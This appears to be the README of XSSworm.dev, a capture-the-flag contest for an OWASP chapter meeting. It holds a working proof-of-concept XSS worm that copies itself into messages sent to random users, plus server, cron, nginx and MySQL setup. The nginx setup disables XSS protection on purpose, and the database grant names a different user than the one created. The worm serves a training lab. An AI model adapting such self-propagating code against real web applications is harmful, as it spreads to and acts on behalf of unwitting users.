# XSSworm.dev

Self-replication contest

---

## Description

I created “CTF” style challenge for our OWASP Czech Chapter Virtual Meeting. The goal was to write an XSS worm and score points by infecting 1k virtual users.

### XSS Worm PoC

```
<script id="xss_worm">
	// XSS worm .dev
	// Self-replication contest
	// Proof of Concept v1.0

	var victims = 1000;
	var team_color = "#000000";
	var url = "https://xssworm.dev";
	var infection_code = "<script id=\"xss_worm\">"+self_propagation()+"<\/script>";

	infect_victim(team_color);

	while (true) {
		var victim_id = get_random_victim(victims);
		spread_infection(victim_id,infection_code);
	}

	function get_random_victim(accounts_count) {
		return Math.floor((Math.random() * accounts_count) + 1);
	}

	function infect_victim(color) {
		var xhr = new XMLHttpRequest();
		var params = "color="+color;
		xhr.open("POST", url+"/update", false);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}

	function self_propagation(){
		return document.getElementById("xss_worm").innerHTML;
	}

	function spread_infection(id,infection_code) {
		var xhr = new XMLHttpRequest();
		var params = "id="+id+"&msg="+encodeURIComponent(infection_code);
		xhr.open("POST", url+"/send-message", false);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(params);
	}
</script>
```

### Usage

```
```

### Installation

```
$ sudo apt-get install build-essential python3 nginx mysql-server python3-pip npm
$ pip3 install flask pymysql bcrypt

$ npm cache clean -f
$ npm install -g n
$ n stable
$ rm /usr/bin/node
$ sudo ln -s /usr/local/bin/node /usr/bin/node

$ sudo apt-get install gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget libgbm-dev

$ npm install puppeteer puppeteer-cluster
```

### Cron

```
$ crontab -e
$ */5 * * * * node /home/xssworm/cluster.js
$ crontab -l
```

### Nginx config

```
server {
	listen 80 default_server;

	server_name "xssworm.dev";

	location / {
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
		#try_files $uri $uri/ =404;
		proxy_pass       http://127.0.0.1:3000;
		proxy_set_header Host      $host;
		proxy_set_header X-Real-IP $remote_addr;

		add_header 'Access-Control-Allow-Origin' '*';
                add_header X-Frame-Options DENY;
                add_header X-Content-Type-Options nosniff;
                add_header X-XSS-Protection "0";
                add_header Strict-Transport-Security "max-age=1337; includeSubdomains; preload";
                add_header Referrer-Policy "no-referrer";
                add_header Permissions-Policy "document-write 'none'";
                add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://unpkg.com; img-src 'self' data: https://validator.swagger.io; frame-src https://validator.swagger.io; font-src 'self' https://fonts.gstatic.com";
	}
}
```

### MySQL database

```
$ mysql -u root -p
$ CREATE DATABASE xssworm;
$ mysql -u root -p xssworm < file.sql

$ CREATE USER 'xssworm'@'localhost' IDENTIFIED BY 'password';
$ GRANT ALL PRIVILEGES ON xssworm.* TO 'newuser'@'localhost';
$ FLUSH PRIVILEGES;

$ show variables like "max_connections";
```

## References

https://vavkamil.cz/2020/12/01/xss-worm-dev-self-replication-contest-write-up/
